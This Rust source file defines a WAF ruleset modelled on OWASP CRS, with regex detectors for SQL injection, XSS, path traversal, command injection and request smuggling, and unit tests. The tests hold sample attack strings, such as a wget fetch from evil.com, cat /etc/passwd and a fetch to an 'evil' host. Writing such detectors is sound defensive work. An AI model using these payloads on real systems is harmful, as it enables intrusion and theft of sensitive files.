// Copyright 2026 Rwx-G (Lorica)
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

use regex::Regex;
use serde::{Deserialize, Serialize};

/// Attack category aligned with OWASP CRS rule groups.
#[derive(Debug, Clone, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum RuleCategory {
    SqlInjection,
    Xss,
    PathTraversal,
    CommandInjection,
    ProtocolViolation,
}

impl RuleCategory {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::SqlInjection => "sql_injection",
            Self::Xss => "xss",
            Self::PathTraversal => "path_traversal",
            Self::CommandInjection => "command_injection",
            Self::ProtocolViolation => "protocol_violation",
        }
    }
}

/// A single WAF rule with a precompiled regex pattern.
pub struct WafRule {
    /// Unique rule ID (CRS-style numbering).
    pub id: u32,
    /// Human-readable description.
    pub description: &'static str,
    /// Attack category.
    pub category: RuleCategory,
    /// Precompiled regex pattern.
    pub pattern: Regex,
    /// Severity score (1-5, higher = more severe).
    pub severity: u8,
}

impl std::fmt::Debug for WafRule {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("WafRule")
            .field("id", &self.id)
            .field("description", &self.description)
            .field("category", &self.category)
            .field("severity", &self.severity)
            .finish()
    }
}

/// A compiled set of WAF rules ready for evaluation.
pub struct RuleSet {
    rules: Vec<WafRule>,
}

impl RuleSet {
    /// Build the default OWASP CRS-inspired ruleset.
    pub fn default_crs() -> Self {
        let rules = vec![
            // --- SQL Injection (CRS 942xxx) ---
            WafRule {
                id: 942100,
                description: "SQL injection via UNION keyword",
                category: RuleCategory::SqlInjection,
                pattern: Regex::new(r"(?i)\bunion\b[\s/\*]+\b(select|all)\b").unwrap(),
                severity: 5,
            },
            WafRule {
                id: 942110,
                description: "SQL injection via comment sequence",
                category: RuleCategory::SqlInjection,
                pattern: Regex::new(r"(?i)('|%27)\s*(--|#|/\*)").unwrap(),
                severity: 4,
            },
            WafRule {
                id: 942120,
                description: "SQL injection via OR/AND with comparison",
                category: RuleCategory::SqlInjection,
                pattern: Regex::new(r"(?i)\b(or|and)\b\s+\d+\s*=\s*\d+").unwrap(),
                severity: 5,
            },
            WafRule {
                id: 942130,
                description: "SQL injection via common functions",
                category: RuleCategory::SqlInjection,
                pattern: Regex::new(
                    r"(?i)\b(sleep|benchmark|waitfor|delay|load_file|into\s+outfile|into\s+dumpfile)\b\s*\(",
                ).unwrap(),
                severity: 5,
            },
            WafRule {
                id: 942140,
                description: "SQL injection via DROP/ALTER/TRUNCATE",
                category: RuleCategory::SqlInjection,
                pattern: Regex::new(
                    r"(?i)\b(drop|alter|truncate|create)\b\s+\b(table|database|index|view)\b",
                ).unwrap(),
                severity: 5,
            },
            WafRule {
                id: 942150,
                description: "SQL injection via stacked queries",
                category: RuleCategory::SqlInjection,
                pattern: Regex::new(r"(?i);\s*\b(select|insert|update|delete|drop|alter)\b").unwrap(),
                severity: 4,
            },
            // --- XSS (CRS 941xxx) ---
            WafRule {
                id: 941100,
                description: "XSS via script tag",
                category: RuleCategory::Xss,
                pattern: Regex::new(r"(?i)<\s*script[\s>]").unwrap(),
                severity: 5,
            },
            WafRule {
                id: 941110,
                description: "XSS via event handler attribute",
                category: RuleCategory::Xss,
                pattern: Regex::new(
                    r"(?i)\bon(error|load|click|mouse\w+|focus|blur|submit|change|key\w+)\s*=",
                ).unwrap(),
                severity: 4,
            },
            WafRule {
                id: 941120,
                description: "XSS via javascript: URI scheme",
                category: RuleCategory::Xss,
                pattern: Regex::new(r"(?i)javascript\s*:").unwrap(),
                severity: 5,
            },
            WafRule {
                id: 941130,
                description: "XSS via data: URI with script content",
                category: RuleCategory::Xss,
                pattern: Regex::new(r"(?i)data\s*:\s*text/html").unwrap(),
                severity: 4,
            },
            WafRule {
                id: 941140,
                description: "XSS via iframe/object/embed tag",
                category: RuleCategory::Xss,
                pattern: Regex::new(r"(?i)<\s*(iframe|object|embed|applet)[\s>]").unwrap(),
                severity: 4,
            },
            WafRule {
                id: 941150,
                description: "XSS via SVG onload",
                category: RuleCategory::Xss,
                pattern: Regex::new(r"(?i)<\s*svg[^>]*\bonload\s*=").unwrap(),
                severity: 4,
            },
            // --- Path Traversal (CRS 930xxx) ---
            WafRule {
                id: 930100,
                description: "Path traversal via dot-dot-slash",
                category: RuleCategory::PathTraversal,
                pattern: Regex::new(r"(\.\./|\.\.\\|%2e%2e[/\\%]|%252e%252e)").unwrap(),
                severity: 5,
            },
            WafRule {
                id: 930110,
                description: "Path traversal via sensitive file access",
                category: RuleCategory::PathTraversal,
                pattern: Regex::new(
                    r"(?i)/(etc/(passwd|shadow|hosts)|proc/self|\.env|\.git/config|wp-config\.php)",
                ).unwrap(),
                severity: 5,
            },
            WafRule {
                id: 930120,
                description: "Path traversal via null byte injection",
                category: RuleCategory::PathTraversal,
                pattern: Regex::new(r"(%00|\\x00|\x00)").unwrap(),
                severity: 5,
            },
            // --- Command Injection (CRS 932xxx) ---
            WafRule {
                id: 932100,
                description: "OS command injection via shell operators",
                category: RuleCategory::CommandInjection,
                pattern: Regex::new(r"[;&|`]\s*(cat|ls|id|whoami|wget|curl|nc|bash|sh|python|perl|ruby|php)\b").unwrap(),
                severity: 5,
            },
            WafRule {
                id: 932110,
                description: "OS command injection via backtick/subshell",
                category: RuleCategory::CommandInjection,
                pattern: Regex::new(r"(`[^`]+`|\$\([^)]+\))").unwrap(),
                severity: 4,
            },
            // --- Protocol Violations (CRS 920xxx) ---
            WafRule {
                id: 920100,
                description: "HTTP request smuggling via invalid content-length",
                category: RuleCategory::ProtocolViolation,
                pattern: Regex::new(r"(?i)content-length\s*:\s*[^\d]").unwrap(),
                severity: 5,
            },
        ];

        Self { rules }
    }

    /// Return a reference to all rules in this set.
    pub fn rules(&self) -> &[WafRule] {
        &self.rules
    }

    /// Return the number of rules in this set.
    pub fn len(&self) -> usize {
        self.rules.len()
    }

    /// Return true if there are no rules.
    pub fn is_empty(&self) -> bool {
        self.rules.is_empty()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_default_crs_loads() {
        let rs = RuleSet::default_crs();
        assert!(!rs.is_empty());
        assert!(rs.len() >= 15);
    }

    #[test]
    fn test_rule_categories_present() {
        let rs = RuleSet::default_crs();
        let categories: std::collections::HashSet<_> =
            rs.rules().iter().map(|r| r.category.clone()).collect();
        assert!(categories.contains(&RuleCategory::SqlInjection));
        assert!(categories.contains(&RuleCategory::Xss));
        assert!(categories.contains(&RuleCategory::PathTraversal));
        assert!(categories.contains(&RuleCategory::CommandInjection));
        assert!(categories.contains(&RuleCategory::ProtocolViolation));
    }

    // --- SQL Injection detection ---

    #[test]
    fn test_sqli_union_select() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 942100).unwrap();
        assert!(rule.pattern.is_match("1 UNION SELECT * FROM users"));
        assert!(rule.pattern.is_match("1 union  select password from admin"));
        assert!(!rule.pattern.is_match("trade union membership"));
    }

    #[test]
    fn test_sqli_comment_sequence() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 942110).unwrap();
        assert!(rule.pattern.is_match("admin' --"));
        assert!(rule.pattern.is_match("admin' #"));
        assert!(rule.pattern.is_match("admin' /*"));
    }

    #[test]
    fn test_sqli_or_equals() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 942120).unwrap();
        assert!(rule.pattern.is_match("' OR 1=1"));
        assert!(rule.pattern.is_match("' and 2=2"));
        assert!(!rule.pattern.is_match("apples or oranges"));
    }

    #[test]
    fn test_sqli_dangerous_functions() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 942130).unwrap();
        assert!(rule.pattern.is_match("SLEEP(5)"));
        assert!(rule.pattern.is_match("benchmark(1000000,md5('test'))"));
        assert!(rule.pattern.is_match("LOAD_FILE('/etc/passwd')"));
    }

    #[test]
    fn test_sqli_ddl_statements() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 942140).unwrap();
        assert!(rule.pattern.is_match("DROP TABLE users"));
        assert!(rule.pattern.is_match("alter table sessions"));
        assert!(rule.pattern.is_match("CREATE DATABASE pwned"));
    }

    #[test]
    fn test_sqli_stacked_queries() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 942150).unwrap();
        assert!(rule.pattern.is_match("; SELECT * FROM users"));
        assert!(rule.pattern.is_match(";drop table users"));
    }

    // --- XSS detection ---

    #[test]
    fn test_xss_script_tag() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 941100).unwrap();
        assert!(rule.pattern.is_match("<script>alert(1)</script>"));
        assert!(rule.pattern.is_match("<SCRIPT src=evil.js>"));
        assert!(!rule.pattern.is_match("noscript"));
    }

    #[test]
    fn test_xss_event_handler() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 941110).unwrap();
        assert!(rule.pattern.is_match("onerror=alert(1)"));
        assert!(rule.pattern.is_match("onload=fetch('http://evil')"));
        assert!(rule.pattern.is_match("ONCLICK=steal()"));
    }

    #[test]
    fn test_xss_javascript_uri() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 941120).unwrap();
        assert!(rule.pattern.is_match("javascript:alert(1)"));
        assert!(rule.pattern.is_match("JAVASCRIPT : void(0)"));
    }

    #[test]
    fn test_xss_iframe() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 941140).unwrap();
        assert!(rule.pattern.is_match("<iframe src=evil.com>"));
        assert!(rule.pattern.is_match("<OBJECT data=x>"));
        assert!(rule.pattern.is_match("<embed src=x>"));
    }

    // --- Path Traversal detection ---

    #[test]
    fn test_path_traversal_dot_dot() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 930100).unwrap();
        assert!(rule.pattern.is_match("../../../etc/passwd"));
        assert!(rule.pattern.is_match("..\\windows\\system32"));
        assert!(rule.pattern.is_match("%2e%2e/"));
        assert!(rule.pattern.is_match("%2e%2e%2f"));
    }

    #[test]
    fn test_path_traversal_sensitive_files() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 930110).unwrap();
        assert!(rule.pattern.is_match("/etc/passwd"));
        assert!(rule.pattern.is_match("/etc/shadow"));
        assert!(rule.pattern.is_match("/proc/self"));
        assert!(rule.pattern.is_match("/.env"));
        assert!(rule.pattern.is_match("/.git/config"));
    }

    #[test]
    fn test_path_traversal_null_byte() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 930120).unwrap();
        assert!(rule.pattern.is_match("file.php%00.jpg"));
    }

    // --- Command Injection detection ---

    #[test]
    fn test_cmdi_shell_operators() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 932100).unwrap();
        assert!(rule.pattern.is_match("; cat /etc/passwd"));
        assert!(rule.pattern.is_match("| whoami"));
        assert!(rule.pattern.is_match("& wget http://evil.com/shell"));
    }

    #[test]
    fn test_cmdi_backtick() {
        let rs = RuleSet::default_crs();
        let rule = rs.rules().iter().find(|r| r.id == 932110).unwrap();
        assert!(rule.pattern.is_match("`id`"));
        assert!(rule.pattern.is_match("$(cat /etc/passwd)"));
    }

    // --- Category as_str ---

    #[test]
    fn test_category_as_str() {
        assert_eq!(RuleCategory::SqlInjection.as_str(), "sql_injection");
        assert_eq!(RuleCategory::Xss.as_str(), "xss");
        assert_eq!(RuleCategory::PathTraversal.as_str(), "path_traversal");
        assert_eq!(RuleCategory::CommandInjection.as_str(), "command_injection");
        assert_eq!(RuleCategory::ProtocolViolation.as_str(), "protocol_violation");
    }
}
